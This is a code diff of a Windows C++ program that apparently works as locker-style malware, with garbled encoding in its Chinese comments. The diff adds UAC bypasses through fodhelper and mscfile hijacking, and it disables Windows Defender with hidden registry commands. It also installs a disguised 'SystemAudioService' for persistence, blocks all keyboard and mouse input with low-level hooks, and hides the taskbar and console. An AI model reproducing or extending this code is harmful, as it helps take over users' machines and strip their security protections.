@@ -7,7 +7,7 @@
 
 using namespace std;
  
-//ªÒ»°µ±«∞exe≥Ã–ÚÀ˘‘⁄¬∑æ∂
+//Ëé∑ÂèñÂΩìÂâçexeÁ®ãÂ∫èÊâÄÂú®Ë∑ØÂæÑ
 char *GetExeFullPath()
 {
 	TCHAR szPath[MAX_PATH];
@@ -18,7 +18,21 @@ char *GetExeFullPath()
 	return pathrtn;
 }
 
-bool IsProcessRunAsAdmin()//≈–∂œ≥Ã–Ú «∑ÒŒ™π‹¿Ì‘±…Ì∑›£® «∑µªÿ1£¨∑Ò‘Ú∑¥÷Æ£© ‘≠Ã˚£∫ https://blog.csdn.net/zcy5157912/article/details/125109747
+int Sysver()
+{
+	typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
+    HINSTANCE hinst = LoadLibrary(TEXT("ntdll.dll"));//Âä†ËΩΩDLL
+    NTPROC GetNtVersionNumbers = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");//Ëé∑ÂèñÂáΩÊï∞Âú∞ÂùÄ
+    DWORD dwMajor, dwMinor, dwBuildNumber;
+    GetNtVersionNumbers(&dwMajor, &dwMinor, &dwBuildNumber);
+    if (dwMajor == 10 && dwMinor == 0){
+        return 10;
+    }
+    if (dwMajor == 6 && dwMinor == 1){
+        return 7;
+    }
+}
+bool IsProcessRunAsAdmin()//Âà§Êñ≠Á®ãÂ∫èÊòØÂê¶‰∏∫ÁÆ°ÁêÜÂëòË∫´‰ªΩÔºàÊòØËøîÂõû1ÔºåÂê¶ÂàôÂèç‰πãÔºâ ÂéüÂ∏ñÔºö https://blog.csdn.net/zcy5157912/article/details/125109747
 {
     SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
     PSID AdministratorsGroup;
@@ -37,35 +51,63 @@ bool IsProcessRunAsAdmin()//≈–∂œ≥Ã–Ú «∑ÒŒ™π‹¿Ì‘±…Ì∑›£® «∑µªÿ1£¨∑Ò‘Ú∑¥÷Æ£© ‘≠Ã˚£∫
     return b == TRUE;
 }
  
-void CloseWD()//◊÷√Ê“‚Àº£¨πÿWindows Denference(Need AdminAccount)  ‘≠Ã˚£∫https://blog.csdn.net/qq_34185638/article/details/127273044 
+void CloseWD()//Â≠óÈù¢ÊÑèÊÄùÔºåÂÖ≥Windows Denference(Need AdminAccount)  ÂéüÂ∏ñÔºöhttps://blog.csdn.net/qq_34185638/article/details/127273044 
 {
-	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD /f");
-	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Sense\" /v \"Start\" /d 4 /t REG_DWORD /f");
-	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /d 4 /t REG_DWORD /f");
-	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /d 4 /t REG_DWORD /f");
-	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /d 4 /t REG_DWORD /f");
-	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /d 4 /t REG_DWORD /f");
-	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /d 4 /t REG_DWORD /f");
+	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD /f", NULL, SW_HIDE);
+	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Sense\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
+	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
+	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
+	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
+	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
+	ShellExecute(NULL, "open", "cmd", "/c reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /d 4 /t REG_DWORD /f", NULL, SW_HIDE);
 } 
 void regsystask()
 {
 	string regcomm = 
-		"sc create TestService binpath= \"" + string(GetExeFullPath()) +"\" start= auto displayname= \"SystemAudioService\"";
+		"sc create SystemAudioService binpath= \"" + string(GetExeFullPath()) +"\" start= auto displayname= \"SystemAudioService\"";
 	const char* cwd_char = regcomm.data();
 	system(cwd_char);
 	system("net start SystemAudioService");
  } 
 
-void kbd_lock()
+HHOOK hook_hwnd_keyboard = NULL;
+HHOOK hook_hwnd_mouse = NULL;
+HMODULE g_module;
+ 
+// Èº†Ê†á‰∫ã‰ª∂
+LRESULT CALLBACK MyHookFunMouse(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	while(1)
+	// Èº†Ê†áÊâÄÊúâ‰∫ã‰ª∂ÈÉΩ‰∏çÂ§ÑÁêÜ
+	return 1;
+}
+ 
+// ÈîÆÁõò‰∫ã‰ª∂
+LRESULT CALLBACK MyHookFunKeyBoard(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	PKBDLLHOOKSTRUCT pVirKey = (PKBDLLHOOKSTRUCT)lParam;
+ 
+	if (nCode >= 0)
 	{
-		keybd_event(VK_TAB,0x45,KEYEVENTF_KEYUP,0);
-		keybd_event(VK_MENU,0x45,KEYEVENTF_KEYUP,0);
-		keybd_event(VK_LCONTROL,0x45,KEYEVENTF_KEYUP,0);
-		keybd_event(VK_RCONTROL,0x45,KEYEVENTF_KEYUP,0);
-		Sleep(10); 
+		// ÊåâÈîÆÊ∂àÊÅØ
+		switch (wParam)
+		{
+		case WM_KEYDOWN:
+		case WM_SYSKEYDOWN:
+		case WM_KEYUP:
+		case WM_SYSKEYUP:
+			switch (pVirKey->vkCode)
+			{
+			case VK_LWIN:
+			case VK_RWIN:
+				return 1;
+				break;
+			}
+			return 1;
+			break;
+		}
 	}
+ 
+	return CallNextHookEx(hook_hwnd_keyboard, nCode, wParam, lParam);
 }
 
 void topmost()
@@ -75,8 +117,10 @@ void topmost()
 		int cX = GetSystemMetrics(SM_CXSCREEN);   
 		int cY = GetSystemMetrics(SM_CYSCREEN);
 		HWND stw = FindWindow("Shell_TrayWnd",NULL); 
-		HWND m = FindWindow("Windows.UI.Core.CoreWindow","∆Ù∂Ø");//ø™ º≤Àµ• 
+		HWND cmd = FindWindow("ConsoleWindowClass",NULL); 
+		HWND m = FindWindow("Windows.UI.Core.CoreWindow","ÂêØÂä®");//ÂºÄÂßãËèúÂçï 
 		SetWindowPos(stw,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
+		SetWindowPos(cmd,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
 		SetWindowPos(m,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
 		HWND top = FindWindow("UnrealClass","Boundary");
 		HWND foreground = GetForegroundWindow();
@@ -111,9 +155,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	bool IsProcessRunAsAdmin();
     void regsystask();
-	void kbd_lock();
 	void CloseWD();
 	void topmost();
+	int Sysver();
 
 	/* zero out the struct and set the stuff we want to modify */
 	memset(&wc,0,sizeof(wc));
@@ -134,14 +178,25 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	}
 	
 	if(IsProcessRunAsAdmin()==0){
-		string cmdbypass =
-			"reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\" + string("open") + "\\command /d \"cmd /c start " + string(GetExeFullPath()) +"\" /f && START /W fodhelper.exe && reg delete HKCU\\Software\\Classes\\ms-settings /f"; 
-		const char* cbs_char = cmdbypass.data();
-		system(cbs_char);
-		PostQuitMessage(0);
+		if(Sysver()==10){
+			string cmdbypass =
+				"/c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\" + string("open") + "\\command /v \"DelegateExecute\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\" + string("open") + "\\command /d \"cmd /c start " + string(GetExeFullPath()) +"\" /f && START /W fodhelper.exe && reg delete HKCU\\Software\\Classes\\ms-settings /f"; 
+			const char* cbs10_char = cmdbypass.data();
+			ShellExecute(NULL, "open", "cmd", cbs10_char, NULL, SW_HIDE);
+			PostQuitMessage(0);
+		}
+		else if(Sysver()==7){
+			string cmdbypass =
+				"/c reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\" + string("open") + "\\command /d \""+ string(GetExeFullPath()) +"\" /f && START /W CompMgmtLauncher.exe && reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f" ;
+			const char* cbs7_char = cmdbypass.data();
+			ShellExecute(NULL, "open", "cmd", cbs7_char, NULL, SW_HIDE);
+			PostQuitMessage(0);
+		}
 	}
-	CloseWD(); 
+	if(IsProcessRunAsAdmin()==1){
 	regsystask();
+	CloseWD(); 
+	}
 	int cX = GetSystemMetrics(SM_CXSCREEN);   
 	int cY = GetSystemMetrics(SM_CYSCREEN);
 
@@ -165,16 +220,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
           
         MYFUNC pFunc = (MYFUNC)GetProcAddress(hInst, "SetLayeredWindowAttributes");  
         if (pFunc != NULL){
-               pFunc(hwnd, 0,25, 2);    
+               pFunc(hwnd, 0,15, 2);    
         	}  
         FreeLibrary(hInst);  
         hInst = NULL;  
     }
+    hook_hwnd_keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, MyHookFunKeyBoard, g_module, 0);
+	hook_hwnd_mouse = SetWindowsHookEx(WH_MOUSE_LL, MyHookFunMouse, g_module, 0);
     EnableWindow(hwnd,false);
     thread topmst(topmost);
     topmst.detach();
-    thread kbd(kbd_lock);
-	kbd.detach();
 	/*
 		This is the heart of our program where all input is processed and 
 		sent to WndProc. Note that GetMessage blocks code flow until it receives something, so
